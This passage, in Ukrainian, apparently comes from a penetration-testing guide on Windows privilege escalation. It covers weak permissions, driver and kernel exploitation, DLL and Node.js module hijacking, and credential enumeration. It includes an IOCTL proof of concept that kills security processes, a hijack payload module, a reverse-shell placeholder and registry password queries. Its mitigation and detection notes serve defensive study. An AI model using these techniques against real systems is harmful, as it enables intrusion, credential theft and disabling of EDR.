У NTFS файл, доступний для читання, може містити іменований потік `:$DATA`, вміст якого не відображається у звичайному списку каталогів. Для невеликого релевантного набору доступних резервних копій або файлів конфігурації перегляньте **назви й розміри** потоків, перш ніж відкривати їхній вміст; Windows надає доступ до них через [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) і PowerShell [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). Назва потоку, що натякає на наявність секрету, — лише підказка. Перевірте ефективні права на читання файлу, підтримку потоків файловою системою, наявність у потоці придатних облікових даних і обліковий запис, з яким вони фактично проходять автентифікацію. Під час звичайного переліку об’єктів уникайте рекурсивного сканування потоків і виведення їхнього вмісту.

## Вхідні файли помічника Windows Driver Kit у запланованих завданнях

Необов’язковий Windows Driver Kit містить `StandaloneRunner.exe`, який може використовувати файли `command.txt`, `reboot.rsf` і файл проєкту `working\rsf.rsf` із каталогу запуску. Заплановане завдання або служба, що запускає цей помічник із привілейованим обліковим записом, може перетворити доступ низькопривілейованого користувача на запис до цих файлів на виконання команд у контексті цього облікового запису, навіть якщо виконуваний файл помічника захищений. Перевірте, що саме привілейований процес використовує ці файли, і що **обидва** допоміжні файли можна створити або змінити; самого факту виявлення помічника недостатньо.

Для запланованого завдання перевірте [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) дії та ACL обох допоміжних файлів. Якщо для завдання не вказано робочий каталог, каталог виконуваного файлу — лише підказка, яку потрібно перевірити, а не доказ того, звідки завдання читає вхідні файли. Також має бути виконано передумову щодо файлу проєкту. Перевірте фактичний принципал завдання, а не припускайте, що воно запускається від імені SYSTEM.

## Програми

### Встановлені програми

Перевірте **дозволи на бінарні файли** (можливо, один із них можна перезаписати й підвищити привілеї) та **папки** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Шлях відновлення агента Checkmk для Windows

[CVE-2024-0670](https://checkmk.com/werk/16361) стосується старіших агентів Checkmk для Windows, які записували файли команд у `C:\Windows\Temp`, а потім виконували наявний файл, захищений від запису, якщо заміна не вдавалася. Постачальник виправив проблему у версіях 2.1.0p40, 2.2.0p23, 2.3.0b1 і 2.4.0b1. Перевірте повний рівень встановлених виправлень і можливість виконання відповідної операції агента; позначення лише гілки, як-от `2.1`, не дає змоги встановити наявність уразливості. Під час переліку можна перевірити версію, стан служби та дозволи для Temp, не створюючи файлів і не запускаючи команди агента.

#### Перевірка служби SAML в ADSelfService Plus

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) стосувалася збірки ADSelfService Plus 6210 і попередніх; постачальник виправив її у збірці 6211. Вона має значення лише якщо SAML SSO **увімкнено або було увімкнено**. Тому запис про встановлений продукт або шлях до служби — це підказка, а не висновок про вразливість: підтвердьте точну збірку, історію конфігурації SAML, доступність служби з мережі та обліковий запис, від імені якого вона працює. Виконання коду через службу використовує привілеї цього облікового запису; виконання від імені SYSTEM можливе лише для екземпляра, що працює від імені SYSTEM. Доступний для читання файл `OfflineBackup_*.ezip` у каталозі Backup продукту є окремою підказкою щодо зашифрованої резервної копії, а не доказом наявності придатних до використання облікових даних чи цієї вади SAML. Під час звичайного переліку зафіксуйте його шлях і права доступу, не розпаковуючи файл.

#### Межі облікових записів контролера Jenkins і домену

На контролері Jenkins під Windows розрізняйте дозвіл на створення чи налаштування завдання та дозвіл на його запуск: [Jenkins описує це як окремі права `Job/Create`, `Job/Configure` і `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Налаштований розклад або віддалений тригер може надати інший спосіб запуску збірки, але переконайтеся, що він увімкнений і збірка справді виконується. Код виконується від імені контролера або вибраного агента, а збережені облікові дані можна використовувати лише тоді, коли завдання має доступ до їхньої області дії. Окремо перевірте доступ до метаданих `JENKINS_HOME`: Jenkins зберігає облікові дані та ключі шифрування у `credentials.xml`, `secrets/hudson.util.Secret` і `secrets/master.key` ([зберігання секретів Jenkins](https://www.jenkins.io/doc/developer/security/secrets/)). Сама їхня наявність не розкриває пароль; перевірте **доступ для читання до потрібних файлів** і окремий шлях повторного використання облікового запису, не виводячи секрети у спільний вивід. Якщо цей обліковий запис має право на запис у `scriptPath` об’єкта AD-користувача, перед тим як вважати це виконанням від імені іншого користувача, підтвердьте доступність шляху для запису та наявність реального входу в систему або запланованого процесу, що працює від імені цільового користувача. Для додаткового контролю над групою потрібні окремо підтверджені ефективні права AD.

#### Ідентифікація self-hosted агента Azure Pipelines

Для проєкту Azure DevOps Server або Azure Pipelines розрізняйте дозвіл **створювати або редагувати** конвеєр, дозвіл **ставити його в чергу** та дозвіл використовувати вибраний пул агентів; [Microsoft окремо описує дозволи конвеєра](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) і [авторизацію пулу](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops). Якщо обліковий запис із нижчими привілеями може надіслати крок сценарію та запустити цей конвеєр на self-hosted агенті Windows, крок виконується від імені [налаштованого для агента облікового запису операційної системи](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Перш ніж стверджувати про перехід між обліковими записами або до SYSTEM, перевірте конкретний конвеєр, обмеження гілок/ресурсів, авторизований пул, завдання, яке можна запустити, та ідентифікатор служби агента. Самі по собі встановлений агент, роль у проєкті чи право запису до репозиторію є лише підказками; під час пасивного переліку перевіряйте дозволи й локальні метадані служби, не запускаючи збірку.

#### Облікові дані Microsoft Entra Connect Sync

[Microsoft розрізняє](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) **обліковий запис служби ADSync**, який запускає службу синхронізації та має доступ до її бази даних SQL, і **обліковий запис з’єднувача AD DS**, права якого в каталозі залежать від налаштованих функцій синхронізації. Облікові дані з’єднувача зберігаються в зашифрованому вигляді в цій базі даних, а ключовий матеріал [захищено DPAPI від імені облікового запису служби ADSync](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Наявність установленої служби синхронізації, групи з назвою, що натякає на локальні права адміністратора, або самого доступу до бази даних не підтверджує можливість розшифрування облікових даних чи ескалації до домену. Окремо перевірте фактичні права на читання бази даних, доступ облікового запису служби до ключа, розташування інсталяції та SQL, налаштовану ідентичність з’єднувача й ефективні привілеї цієї ідентичності в AD. Під час звичайного переліку виводьте лише метадані служби та доступу, не запитуючи й не виводячи збережені секрети.

#### Дозволи на DLL підтримки драйвера принтера

Встановлений драйвер принтера може зберігати DLL підтримки в `C:\ProgramData` і завантажувати їх у привілейованому процесі друку. Перевірте ACL точного каталогу драйвера та DLL, включно з батьківськими каталогами й точками повторної обробки, навіть якщо перелік принтерів через WMI заборонено. Для [проблеми з драйвером принтера Ricoh CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) вказаний шлях був `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [в оригінальному описі](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) йдеться про завантаження DLL процесом `PrintIsolationHost.exe`. ACL із дозволом на запис — лише підказка: перевірте ефективний доступ на запис з урахуванням заборонних записів, що відповідний драйвер установлено й він завантажує файл із привілейованою ідентичністю, а також чи усунули проблему оновлений драйвер або програма безпеки постачальника. Не робіть висновок про вразливість лише за назвою каталогу чи версією драйвера.

### Дозволи на запис

Перевірте, чи можете ви змінити файл конфігурації, щоб прочитати певний спеціальний файл, або змінити виконуваний файл, який запускатиметься від імені облікового запису адміністратора (schedtasks).

Один зі способів знайти в системі каталоги/файли зі слабкими дозволами:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Автозавантаження плагінів Notepad++ для закріплення/виконання

Notepad++ автоматично завантажує будь-яку DLL плагіна з підпапок `plugins`. Якщо є доступна для запису портативна/копійована інсталяція, розміщення шкідливого плагіна забезпечує автоматичне виконання коду всередині `notepad++.exe` під час кожного запуску (зокрема з `DllMain` і callback-функцій).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Запуск під час старту системи

**Перевірте, чи можете перезаписати якийсь запис реєстру або бінарний файл, який запускатиме інший користувач.**\
**Прочитайте** **наступну сторінку**, щоб дізнатися більше про цікаві **місця autoruns для підвищення привілеїв**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Драйвери

Пошукайте можливі **сторонні дивні/вразливі** драйвери

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Якщо драйвер надає примітив довільного читання/запису в ядрі (поширена проблема погано спроєктованих обробників IOCTL), можна підвищити привілеї, безпосередньо викравши токен SYSTEM із пам’яті ядра.<sup>[[13]](#references)</sup> Покроковий опис техніки наведено тут:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

Для вразливостей типу race condition, коли вразливий виклик відкриває шлях Object Manager, навмисне сповільнення пошуку (за допомогою компонентів максимальної довжини або глибоких ланцюжків каталогів) може збільшити вікно з мікросекунд до десятків мікросекунд:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### UAF у cancel-safe queue, розкриття даних із paged-pool і переходи через I/O ring

Деякі ланцюжки LPE у ядрі Windows можна побудувати з двох окремо слабких вразливостей: **race condition життєвого циклу cancel-safe queue**, що звільняє запит/CBD, поки блокування черги все ще утримується, та розкриття даних через **звільнення блокування перед копіюванням**, яке дає змогу витікати даним зі звільненого виділення paged-pool під час `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Нотатки щодо аудиту та експлуатації:

- **Звільнення під блокуванням + подальше скасування**: шукайте шлях успішного виконання, який робить **Acquire -> CompleteRequest/free -> Release**, тоді як шлях скасування робить **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Якщо шлях успішного виконання доходить до `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` до звільнення блокування CBDQ/CSQ, потік, заблокований у `NtCancelIoFileEx -> IopCsqCancelRoutine`, може пізніше продовжити виконання та передати звільнений `PFLT_CALLBACK_DATA` назад у функцію зворотного виклику драйвера для видалення.
- **Повторно використайте звільнений об’єкт черги**, виділивши в paged-pool об’єкт такого самого розміру, вміст якого контролює атакувальник. Записи черги даних `NPFS` корисні, оскільки вміст і розмір можна контролювати, а згодом перевіряти за допомогою операцій читання/перегляду каналу. Якщо звільнений об’єкт містить посилання списку, перезапишіть їх **циклічним списком фальшивих вузлів запиту в пам’яті користувача**, щоб драйвер неодноразово обробляв визначені атакувальником структури запитів, а не зупинявся на початковій голові списку.
- **Розширте можливості передбачуваного запису**: якщо фальшивий запит перенаправляє вкладений вказівник контексту, який використовується для записів облікових даних (часові позначки / QPC / поля поруч із лічильником посилань), можна отримати запис у ядро, **адреса якого контролюється, а значення — ні**. У такому разі націльтеся на поле **length/size** об’єкта з розпорошеного пулу, а не на кінцевий вказівник коду/даних, а потім переберіть об’єкти розпорошення, доки пошкоджений об’єкт не забезпечить **читання за межами виділеної області в paged-pool**.
- **Шаблон розкриття даних, вразливий до race condition**: будь-який системний виклик, що виконує `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)`, є перспективним кандидатом. Надійність підвищується, коли атакувальник може збільшити буфер, що копіюється (наприклад, додавши багато записів списку/ресурсів, які збільшують кінцевий розмір виділення серіалізатора), оскільки довше копіювання розширює вікно заміни, не обов’язково спричиняючи збій системи.
- **Цілі для повторного заповнення, що містять багато вказівників**: масиви зареєстрованих буферів Windows **I/O ring** — чудові цілі для розкриття даних, оскільки їхній розмір у paged-pool контролює атакувальник (`8 * regBufferCnt`), а кожен елемент є вказівником ядра на `_IOP_MC_BUFFER_ENTRY`. Витік одного з таких масивів дає змогу відновити навколишній `IORING_OBJECT`, а потім пошкодити **`RegBuffers`** і **`RegBuffersCount`**, щоб наступні операції I/O ring використовували підроблені атакувальником записи й надавали довільне читання/запис у ядрі. Якщо доступний лише запис зі стабільним байтом (наприклад, зі зміщення `KUSER_SHARED_DATA+0x14`), скористайтеся **перекривними невирівняними записами**, щоб створити вказівник користувача з повторюваних байтів, наприклад `0x0101010101010101`, відобразіть його за допомогою `VirtualAlloc` і розмістіть там підроблений масив зареєстрованих буферів.<sup>[[30]](#references)</sup>

Корисні індикатори для налагодження:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Щойно отримаєте довільні права читання/запису ядра через пошкоджене кільце I/O, викрадіть токен SYSTEM за допомогою стандартної процедури після отримання примітива:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Примітиви пошкодження пам’яті куща реєстру

Сучасні вразливості кущів реєстру дають змогу формувати детерміновані структури пам’яті, зловживати нащадками HKLM/HKU, доступними для запису, і перетворювати пошкодження метаданих на переповнення paged pool ядра без власного драйвера. Повний ланцюжок описано тут:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Плутанина типів у режимі direct `RtlQueryRegistryValues` через шляхи, контрольовані зловмисником

Деякі драйвери приймають шлях до реєстру з userland, перевіряють лише те, що це коректний рядок UTF-16, а потім викликають `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` із `RTL_QUERY_REGISTRY_DIRECT` для запису в скалярне значення у стеку, наприклад `int readValue`. Якщо прапорець `RTL_QUERY_REGISTRY_TYPECHECK` відсутній, `EntryContext` інтерпретується відповідно до **фактичного** типу реєстру, а не типу, якого очікував розробник.

Це створює два корисні примітиви:<sup>[[24]](#references)[[25]](#references)</sup>

- **Заплутаний посередник / оракул**: контрольований користувачем абсолютний шлях `\Registry\...` дає змогу драйверу опитувати вибрані зловмисником ключі, розкривати їх наявність через коди повернення/журнали, а іноді й читати значення, до яких викликач не мав би прямого доступу.
- **Пошкодження пам’яті ядра**: адреса призначення скалярного значення, наприклад `&readValue`, через плутанину типів може трактуватися як `REG_QWORD`, `UNICODE_STRING` або буфер двійкових даних заданого розміру — залежно від типу значення реєстру.

Практичні нотатки щодо експлуатації:

- **Захист у Windows 8+**: якщо запит звертається до **недовіреного куща** через `RTL_QUERY_REGISTRY_DIRECT`, але без `RTL_QUERY_REGISTRY_TYPECHECK`, виклики з ядра призводять до аварійного завершення з `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Щоб зберегти можливість експлуатації, шукайте **ключі, доступні зловмиснику для запису, у довірених системних кущах**, а не розміщуйте значення в `HKCU`.
- **Підготовка даних у довіреному кущі**: скористайтеся NtObjectManager, щоб перелічити нащадків `\Registry\Machine`, доступних для запису, а потім повторіть пошук із дубльованим токеном **низького рівня цілісності**, щоб знайти ключі, доступні з пісочниць:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: прямий запис 8 байтів у 4-байтовий `int` пошкоджує суміжні дані в stack і може частково перезаписати сусідній callback/function pointer.
- **`REG_SZ` / `REG_EXPAND_SZ`**: у direct mode очікується, що `EntryContext` вказує на `UNICODE_STRING`. Якщо код спочатку завантажує контрольований зловмисником `REG_DWORD` у скалярну змінну в stack, а потім повторно використовує той самий буфер для читання рядка, зловмисник контролює `Length`/`MaximumLength` і частково впливає на вказівник `Buffer`, що дає напівконтрольований запис у kernel.
- **`REG_BINARY`**: для великих бінарних даних direct mode трактує перший `LONG` за адресою `EntryContext` як розмір буфера зі знаком. Якщо попереднє читання `REG_DWORD` залишає в повторно використаному скалярі **від’ємне** значення, контрольоване зловмисником, наступний запит `REG_BINARY` копіює байти зловмисника безпосередньо в сусідні слоти в stack — це часто найпростіший шлях до повного перезапису callback pointer.

Надійний шаблон для пошуку: **читання різнорідних значень реєстру в ту саму змінну в stack без її повторної ініціалізації**. Шукайте `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, повторно використані вказівники `EntryContext` і шляхи виконання, де перше читання реєстру визначає, чи відбудеться друге.

#### Зловживання відсутністю FILE_DEVICE_SECURE_OPEN на об’єктах пристроїв (LPE + знищення EDR)

Деякі підписані драйвери сторонніх виробників створюють об’єкти пристроїв із надійним SDDL за допомогою IoCreateDeviceSecure, але забувають установити FILE_DEVICE_SECURE_OPEN у DeviceCharacteristics. Без цього прапорця захищений DACL не застосовується, коли пристрій відкривають через шлях із додатковим компонентом, тож будь-який непривілейований користувач може отримати handle, використавши шлях у просторі імен на зразок:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (з реального випадку)

Отримавши змогу відкрити пристрій, користувач може зловживати привілейованими IOCTL, які надає драйвер, для LPE і втручання в роботу системи. Приклади можливостей, виявлених у реальних випадках:
- Повернення handle із повним доступом до довільних процесів (крадіжка токена / запуск shell від SYSTEM через DuplicateTokenEx/CreateProcessAsUser).
- Необмежене читання/запис на диск напряму (втручання в систему офлайн, трюки зі збереженням доступу під час завантаження).
- Завершення довільних процесів, зокрема Protected Process/Light (PP/PPL), що дає змогу знищити AV/EDR із user land через kernel.

Мінімальний шаблон PoC (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Заходи пом’якшення для розробників
- Завжди встановлюйте FILE_DEVICE_SECURE_OPEN під час створення об’єктів пристроїв, доступ до яких має обмежуватися DACL.
- Перевіряйте контекст виклику для привілейованих операцій. Додавайте перевірки PP/PPL, перш ніж дозволяти завершення процесу або повертати дескриптори.
- Обмежуйте IOCTL (маски доступу, METHOD_*, перевірка вхідних даних) і розгляньте моделі з брокером замість прямого доступу до привілеїв ядра.

Ідеї для виявлення для захисників
- Відстежуйте відкриття підозрілих імен пристроїв із user mode (наприклад, \\ .\\amsdk*) і певні послідовності IOCTL, що можуть свідчити про зловживання.
- Увімкніть блокування вразливих драйверів Microsoft (HVCI/WDAC/Smart App Control) і ведіть власні списки дозволених і заборонених драйверів.


## PATH DLL Hijacking

Якщо у вас є **дозвіл на запис до папки, що міститься в PATH**, ви можете перехопити DLL, завантажену процесом, і **підвищити привілеї**.<sup>[[2]](#references)</sup>

Перевірте дозволи для всіх папок у PATH:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Щоб дізнатися більше про те, як зловживати цією перевіркою:

{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Перехоплення розв’язання модулів Node.js / Electron через `C:\node_modules`

Це варіант **Windows uncontrolled search path**, який впливає на програми **Node.js** та **Electron**, коли вони виконують імпорт без зазначення шляху, наприклад `require("foo")`, а очікуваний модуль **відсутній**.<sup>[[20]](#references)</sup>

Node шукає пакети, рухаючись угору деревом каталогів і перевіряючи папки `node_modules` у кожному батьківському каталозі. У Windows цей пошук може дійти до кореня диска, тому програма, запущена з `C:\Users\Administrator\project\app.js`, може перевіряти такі шляхи:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Якщо **користувач із низькими привілеями** може створити `C:\node_modules`, він може розмістити там шкідливий `foo.js` (або папку пакета) і чекати, поки **процес Node/Electron із вищими привілеями** спробує знайти відсутню залежність. Payload виконається в контексті безпеки процесу-жертви, тож це стає **LPE**, якщо цільова програма запускається від імені адміністратора, у межах підвищеного завдання планувальника чи обгортки служби або як привілейований застосунок для робочого столу з автозапуском.

Таке особливо часто трапляється, коли:

- залежність оголошена в `optionalDependencies`<sup>[[22]](#references)</sup>
- стороння бібліотека обгортає `require("foo")` у `try/catch` і продовжує роботу після помилки
- пакет видалили зі збірок для production, не включили під час пакування або не вдалося встановити
- вразливий виклик `require()` розташований глибоко в дереві залежностей, а не в основному коді програми

### Пошук вразливих цілей

Використовуйте **Procmon**, щоб підтвердити шлях пошуку:<sup>[[23]](#references)</sup>

- Фільтр `Process Name` = виконуваний файл цілі (`node.exe`, EXE-файл застосунку Electron або процес-обгортка)
- Фільтр `Path` `contains` `node_modules`
- Зверніть увагу на `NAME NOT FOUND` і останнє успішне відкриття в `C:\node_modules`

Корисні шаблони для перевірки коду в розпакованих файлах `.asar` або вихідному коді застосунку:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Визначте **назву відсутнього пакета** за допомогою Procmon або аналізу вихідного коду.
2. Створіть кореневий каталог пошуку, якщо його ще не існує:

```powershell
mkdir C:\node_modules
```

3. Розмістіть модуль із точно очікуваною назвою:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Запустіть застосунок-жертву. Якщо застосунок спробує виконати `require("foo")`, а легітимний модуль відсутній, Node може завантажити `C:\node_modules\foo.js`.

Реальні приклади відсутніх необов’язкових модулів, що відповідають цьому шаблону, — `bluebird` і `utf-8-validate`, але **техніка** полягає в тому, що її можна повторно застосувати: знайдіть будь-який **відсутній імпорт без шляху**, який привілейований процес Windows Node/Electron спробує знайти.

### Ідеї для виявлення та посилення захисту

- Створіть сповіщення про створення користувачем `C:\node_modules` або запису до цієї папки нових файлів чи пакетів `.js`.
- Шукайте процеси з високим рівнем цілісності, які читають файли з `C:\node_modules\*`.
- Додавайте всі залежності середовища виконання до production-збірки та перевіряйте використання `optionalDependencies`.
- Перевіряйте сторонній код на наявність шаблонів `try { require("...") } catch {}`, які приховують помилки.
- Вимикайте необов’язкові перевірки, якщо бібліотека це підтримує (наприклад, у деяких конфігураціях `ws` можна уникнути застарілої перевірки `utf-8-validate` за допомогою `WS_NO_UTF_8_VALIDATE=1`).

## Мережа

### Спільні ресурси

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### файл hosts

Перевірте, чи в файлі hosts жорстко прописані інші відомі комп’ютери.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Мережеві інтерфейси та DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Відкриті порти

Перевірте наявність **обмежених служб** ззовні.

```bash
netstat -ano #Opened ports?
```

Для локального слухача зіставте його PID із власником процесу, шляхом до виконуваного файла та службою або запланованим завданням, яке його запускає. Служба віддаленого керування може надати доступ від імені свого користувача робочого столу лише за умови, що це дозволяють її автентифікація та засоби керування командами. Спеціальна TCP-програма, що працює від імені облікового запису з вищими привілеями, — це окремий об’єкт перевірки: слухач і шлях до бінарного файла — лише пасивні зачіпки, а для підтвердження шляху через пошкодження пам’яті з автентифікацією потрібно проаналізувати саме цей бінарний файл і доступні йому вхідні дані. Якщо здається, що відкритий порт належить системному процесу, перш ніж визначати службу на кінцевому вузлі, порівняйте його з [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface); саме по собі правило переспрямування не доводить, що кінцевий вузол доступний або вразливий.

### Таблиця маршрутизації

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### Таблиця ARP

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Правила брандмауера

[**Перегляньте цю сторінку, щоб дізнатися про команди для роботи з брандмауером**](../basic-cmd-for-pentesters.md#firewall) **(перегляд правил, створення правил, вимкнення тощо)**

Більше [команд для мережевої розвідки — тут](../basic-cmd-for-pentesters.md#network)

### Підсистема Windows для Linux (WSL)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Двійковий файл `bash.exe` також можна знайти в `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Якщо ви отримаєте права користувача root, зможете прослуховувати будь-який порт (під час першої спроби використати `nc.exe` для прослуховування порту з’явиться вікно GUI із запитом, чи дозволити `nc` працювати через брандмауер).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Щоб легко запустити bash від імені root, можна спробувати `--default-user root`

Файлову систему `WSL` можна переглянути в папці `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

Права `root` у Linux усередині WSL самі по собі не надають прав адміністратора Windows. Якщо поточний обліковий запис Windows має змогу читати файлову систему дистрибутива, перевірте файли історії команд оболонки (зокрема `/root/.bash_history`) на наявність команд, у яких могли зберегтися облікові дані; для підвищення привілеїв усе одно потрібен дійсний обліковий запис із вищими привілеями та дозволений спосіб автентифікації. Структура `LocalState\rootfs` характерна для старіших інсталяцій WSL; у WSL 2 дистрибутив зазвичай зберігається на віртуальному диску [`ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space), тому спершу з’ясуйте фактичний дистрибутив і шлях зберігання. Не виводьте вміст історії команд під час автоматизованого перебирання.

## Облікові дані Windows

### Облікові дані Winlogon

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Вважайте `DefaultUserName` і `DefaultDomainName` контекстом облікового запису, а не обліковими даними. Непорожнє значення `DefaultPassword` або `AltDefaultPassword` — це знахідка з відкритим текстом у реєстрі. Якщо `AutoAdminLogon=1`, але пароль у відкритому тексті недоступний для читання, це лише зачіпка: [Sysinternals Autologon може зберігати пароль як секрет LSA](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), а звичайне читання реєстру не дає змоги визначити, чи існує цей секрет і чи можна його отримати. Перш ніж повідомляти про витік облікових даних, перевірте права доступу та фактичну конфігурацію входу.

### Менеджер облікових даних / сховище Windows

З [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault зберігає облікові дані для серверів, вебсайтів та інших програм, які **Windows** може використовувати, щоб **автоматично входити в систему для користувачів**. Спершу може здатися, що користувачі можуть зберігати облікові дані для таких сайтів, як Facebook, Twitter або Gmail, і автоматично входити на них через браузери, але це працює не так.

Windows Vault зберігає облікові дані, за допомогою яких Windows може автоматично входити в систему для користувачів. Це означає, що будь-яка **програма Windows, якій потрібні облікові дані для доступу до ресурсу** (сервера або вебсайту), **може використовувати цей Credential Manager** і Windows Vault, а також застосовувати надані облікові дані замість того, щоб щоразу вводити ім’я користувача й пароль.

